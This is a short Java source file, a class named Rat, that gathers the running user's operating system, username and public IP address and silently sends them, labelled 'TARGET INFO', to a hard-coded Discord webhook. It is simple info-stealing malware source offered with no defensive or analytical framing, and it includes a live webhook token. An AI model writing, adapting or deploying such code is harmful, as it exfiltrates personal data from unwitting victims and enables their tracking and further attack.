package org.example;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;

public class Rat {
    public static void main(String[] args) {
        String os = System.getProperty("os.name");
        String ip = "Not Found";
        String name = "Not Found";
        String minecraft_name = "Not Found";

        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            ip = bufferedReader.readLine();
            name = System.getProperty("user.name");
        } catch (UnknownHostException e) {
        } catch (MalformedURLException e) {
        } catch (IOException e) {
        }

        WebhookClient client = WebhookClient.withUrl("https://discord.com/api/webhooks/1047873280889061406/wirka7va10jubmId_an_qm-voZNX9l-THECTCf1B-gNQObLLS1R1O4zXRqfX6678yZz_");
        WebhookEmbed embed = new WebhookEmbedBuilder()
                .setColor(0x9667)
                .setTitle(new WebhookEmbed.EmbedTitle("TARGET INFO",null))
                .addField(new WebhookEmbed.EmbedField(true,"OS:",os))
                .addField(new WebhookEmbed.EmbedField(true,"NAME::",name))
                .addField(new WebhookEmbed.EmbedField(true,"IP:",ip))
                .build();

        client.send(embed);



    }
}
